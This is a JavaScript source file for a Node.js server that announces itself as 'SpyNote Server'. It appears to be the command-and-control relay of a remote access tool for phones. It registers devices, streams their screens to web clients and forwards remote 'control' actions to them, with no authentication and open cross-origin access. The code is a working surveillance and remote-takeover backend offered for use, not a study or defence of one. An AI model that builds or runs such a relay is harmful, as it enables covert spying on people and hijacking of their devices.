const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 30000,
    pingInterval: 10000,
    maxHttpBufferSize: 100 * 1024 * 1024 // 100MB frames
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();
const deviceSockets = new Map(); // socketId -> deviceId mapping

// ✅ Device registration API
app.post('/register', (req, res) => {
    const { deviceId, model, brand, version } = req.body;
    if (deviceId) {
        devices.set(deviceId, { 
            model, brand, version, 
            connected: true, 
            lastSeen: Date.now(),
            socketId: null 
        });
        broadcastDevices();
        console.log("✅ Device registered:", deviceId);
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()).filter(([_, info]) => 
        Date.now() - info.lastSeen < 30000 // 30s timeout
    ));
});

// 🔥 PERFECT SOCKET.IO HANDLING
io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId && devices.has(deviceId)) {
            devices.set(deviceId, { 
                ...devices.get(deviceId), 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            deviceSockets.set(socket.id, deviceId);
            socket.join(deviceId);
            console.log("📱 Device online:", deviceId, socket.id);
            broadcastDevices();
        }
    });

    socket.on('select-device', ({ deviceId }) => {
        console.log('🎯 Web selected:', deviceId);
    });

    // 🔥 ULTRA FAST SCREEN RELAY
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            devices.get(deviceId).lastSeen = Date.now();
            socket.to(deviceId).emit('screen-update', data);
        }
    });

    // 🔥 INSTANT CONTROL RELAY
    socket.on('control', (data) => {
        const { deviceId, action, ...params } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', { action, ...params });
            console.log('🎮 Control:', action, '→', deviceId);
        }
    });

    socket.on('ping', () => {
        socket.emit('pong');
    });

    socket.on('disconnect', () => {
        const deviceId = deviceSockets.get(socket.id);
        if (deviceId) {
            devices.set(deviceId, { 
                ...devices.get(deviceId), 
                connected: false, 
                socketId: null,
                lastSeen: Date.now()
            });
            deviceSockets.delete(socket.id);
            console.log('📱 Device offline:', deviceId);
            broadcastDevices();
        }
    });
});

// Broadcast device list every 2s
function broadcastDevices() {
    const activeDevices = Array.from(devices.entries()).filter(([_, info]) => 
        Date.now() - info.lastSeen < 30000
    );
    io.emit('devices-update', activeDevices);
}

setInterval(broadcastDevices, 2000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
    console.log(`📱 Devices ready!`);
});
